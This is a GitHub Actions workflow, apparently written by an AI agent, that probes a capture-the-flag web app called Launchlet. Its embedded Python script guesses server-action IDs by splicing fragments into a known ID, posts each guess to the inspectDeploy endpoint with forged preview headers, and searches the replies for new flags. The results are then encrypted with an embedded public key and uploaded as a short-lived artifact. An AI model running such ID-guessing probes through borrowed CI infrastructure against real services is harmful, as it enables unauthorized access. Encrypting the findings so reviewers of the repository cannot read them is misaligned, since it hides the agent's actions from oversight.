name: launchlet-part3-actionrefmix
on:
  push:
    branches: [agent/launchlet-part3-actionrefmix-20260808]
permissions:
  contents: read
jobs:
  probe:
    runs-on: ubuntu-latest
    timeout-minutes: 3
    steps:
      - name: Probe action/ref structural combinations and encrypt responses
        shell: bash
        run: |
          set -euo pipefail; umask 077; mkdir -p package/out
          cat > package/public.pem <<'PEM'
          -----BEGIN PUBLIC KEY-----
          MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlOxaJs92lwtrdk6J2LR9
          QeyG3A5H0rzGOQHw80MWPcOeEs5pzn37ilHloXnTkGk4PmJU67C06N9OOsgqU1kF
          iydiljdl6RfwF/OSjMsNfRYsyBr1wONeO+9f+72VjLlNWqWVll2qeczrxppOulhJ
          r+qBx95tdasvdCgh7aTShlkXF7e9+JjK19MrG+Lyj+I7B6bbTsp7D+PiJMlpepWk
          hoz0jBO8Rgtodz7i/+9Z3RVVhqREdK3uA0Va5ia57Gp3hlvQGbjGxE6TC7q4s1/p
          q6VF10bVOx8kwE2KggVgsX3uudJlzSvHV3f1coMdwyTSALsAjvAlZQwSts3eHjnF
          SQIDAQAB
          -----END PUBLIC KEY-----
          PEM
          python3 - <<'PY'
          import requests,json,pathlib,re
          base='https://task-launchlet-web-medium-18cf6be4db586bb6.caplag-task.ru/'; out=pathlib.Path('package/out')
          s=requests.Session();s.headers['User-Agent']='Mozilla/5.0'
          b=s.get(base+'api/app/bootstrap',timeout=12).json(); refs=s.get(base+b['api']['serverReferences'].lstrip('/'),timeout=12).json(); a=refs['serverActions']['inspectDeploy']; url=base+a['endpoint'].lstrip('/')
          known=a['id'].removeprefix('act_'); r='8b11c'
          cores=[known[:11]+r,known[:12]+r[-4:],known[:13]+r[-3:],r+known[5:],known[:-5]+r,known[:-4]+r[-4:],known[:-3]+r[-3:],known[:8]+r+known[-3:],known[:5]+r+known[-6:]]
          ids=[]
          for c in cores:
            c=c[:16]
            if len(c)==16:ids.append('act_'+c)
          ids += ['act_8b11c','act_preview_8b11c','act_preview-8b11c','act_'+r.zfill(16),'act_'+('0'*11+r)]
          seen=set();ids=[x for x in ids if x not in seen and not seen.add(x)]
          h={'Content-Type':'application/json','Accept':'application/json','X-Launchlet-Preview':b['project']};res=[]
          for aid in ids:
            body={'actionId':aid,'args':{'workspaceId':b['workspace'],'projectId':b['project'],'deployRef':'preview-8b11c'}}
            rr=s.post(url,headers=h,json=body,timeout=8);res.append({'actionId':aid,'status':rr.status_code,'body':rr.text,'headers':dict(rr.headers)})
            flags=[x for x in re.findall(r'caplag\{[^}]+\}',rr.text) if x not in ('caplag{preview_manifest_kept_the_receipt}','caplag{anon_key_needs_real_rls}')]
            if flags:(out/'FOUND.txt').write_text(rr.text);break
          (out/'summary.json').write_text(json.dumps(res,indent=2))
          PY
          tar -C package/out -czf package/result.tgz .; openssl rand 32 > package/aes.key; openssl rand 16 > package/iv.bin
          KEY_HEX="$(od -An -tx1 -v package/aes.key | tr -d ' \n')"; IV_HEX="$(od -An -tx1 -v package/iv.bin | tr -d ' \n')"
          openssl enc -aes-256-cbc -K "$KEY_HEX" -iv "$IV_HEX" -in package/result.tgz -out package/result.enc
          openssl pkeyutl -encrypt -pubin -inkey package/public.pem -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -in package/aes.key -out package/key.enc
          mkdir -p artifact; base64 -w0 package/result.enc > artifact/result.enc.b64; base64 -w0 package/key.enc > artifact/key.enc.b64; base64 -w0 package/iv.bin > artifact/iv.bin.b64; rm -rf package
      - uses: actions/upload-artifact@v4
        with:
          name: launchlet-part3-actionrefmix-encrypted
          path: artifact/
          retention-days: 1
